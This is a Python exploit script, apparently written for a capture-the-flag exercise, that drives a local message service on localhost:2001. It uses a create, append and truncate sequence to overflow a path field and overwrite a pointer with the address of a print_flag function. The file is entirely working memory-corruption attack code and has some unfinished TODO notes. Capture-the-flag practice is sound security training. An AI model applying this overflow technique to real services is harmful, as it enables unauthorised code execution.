#!/usr/bin/python3

import socket
import sys
import telnetlib

s = socket.create_connection(('localhost', 2001))

SERVICE_NAME = 'orientation'
MESSAGE_NAME = 'test'
MESSAGE_PATH = 'messages/' + SERVICE_NAME + '/' + MESSAGE_NAME + '.message'
ADDRESS = 0x4021ec.to_bytes(8, 'little')
# TODO: store a message, start appending, truncate, append address and stuff
# print_flag at 004021ec



def delete_message(s):
    print('Deleting message: ' + MESSAGE_PATH)
    data = 'delete_message\n'
    s.send(data.encode('ASCII'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))


MAX_SIZE = 0x800
APPEND_SIZE = 0x88 + 8
MESSAGE_SIZE = MAX_SIZE - APPEND_SIZE
def uplink_message(s):
    print('Creating message: ' + MESSAGE_PATH)
    data = 'uplink_message\n'
    s.send(data.encode('ASCII'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = str(MESSAGE_SIZE) + '\n'
    s.send(data.encode('ASCII'))
    data = 'a' * MESSAGE_SIZE + '\n'
    s.send(data.encode('ASCII'))


# TODO: see if need null byte at end of string
PATH_REST = 0x88 - len(MESSAGE_PATH)
def append_to_message(s):
    print('Appending message: ' + MESSAGE_PATH)
    data = 'append_to_message\n'
    s.send(data.encode('ASCII'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = str(APPEND_SIZE) + '\n'
    s.send(data.encode('ASCII'))

    data = MESSAGE_PATH.encode('ASCII')
    data += b'\x00' * PATH_REST
    data += ADDRESS
    data += b'\n'
    input("Press ENTER after truncating...")
    s.send(data)


def downlink_message(s):
    print('Fetching message: ' + MESSAGE_PATH)
    data = 'downlink_message\n'
    s.send(data.encode('ASCII'))
    print(s.recv(1024).decode('UTF-8'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    print(s.recv(1024).decode('UTF-8'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    print(s.recv(1024))
    print(s.recv(1024))
    print(s.recv(1024))
    print(s.recv(1024))
    print(s.recv(1024))



delete_message(s)
uplink_message(s)
append_to_message(s)
print(s.recv(1024).decode('UTF-8'))
downlink_message(s)



t = telnetlib.Telnet()
t.sock = s
# t.interact()
s.close()
